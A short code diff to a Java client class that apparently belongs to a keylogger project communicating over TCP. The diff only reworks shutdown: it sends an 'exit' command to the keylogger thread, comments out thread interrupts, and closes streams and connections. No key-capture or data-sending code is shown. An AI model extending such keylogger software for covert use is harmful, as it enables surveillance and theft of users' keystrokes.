@@ -47,7 +47,9 @@ public class Client implements Runnable {
 
     private void terminate()
     {
+        sendKeyloggerCommand("exit");
         runningFlag = false;
+
     }
 
     public void run() {
@@ -91,12 +93,15 @@ public class Client implements Runnable {
 
             }
 
-            keyloggerThread.interrupt();
+//            keyloggerThread.interrupt();
             keyloggerThread.join();
-            tcpListenerThread.interrupt();
+//            istream.
+            istream.close();
+//            tcpListenerThread.interrupt();
             tcpListenerThread.join();
-
+            connection.close();
             svr.close();
+
 
         } catch (IOException e) {
             e.printStackTrace();
